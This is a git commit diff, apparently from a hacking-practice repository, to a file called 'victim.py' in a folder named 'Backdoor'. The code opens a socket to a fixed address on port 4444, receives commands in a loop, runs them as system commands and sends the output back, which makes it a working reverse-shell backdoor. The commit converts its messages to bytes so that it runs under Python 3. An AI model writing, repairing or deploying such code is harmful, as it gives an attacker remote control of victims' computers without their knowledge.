ef1570ab295320add9d165501ffe5bca80f72eac
Melih Sunman <76569614+sunman54@users.noreply.github.com>
2024-01-10 22:16:24 +0300

    byte-type result sended

--- 11- Backdoor/victim.py
+++ 11- Backdoor/victim.py
@@ -10,17 +10,17 @@ def execute_system_command(command):
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(('192.168.106.129',4444))
 
-connection.send('\n[+] Connected!!!\n')
+connection.send(b'\n[+] Connected!!!\n')
 
 while True:
     command = connection.recv(1024)
 
     if command=='exit':
-        connection.send('\n[x] Connection closed ...\n')
+        connection.send(b'\n[x] Connection closed ...\n')
         break
 
     result = execute_system_command(command)
-    connection.send(f'\n{result}\n')
+    connection.send(result)
 
 
 connection.close()
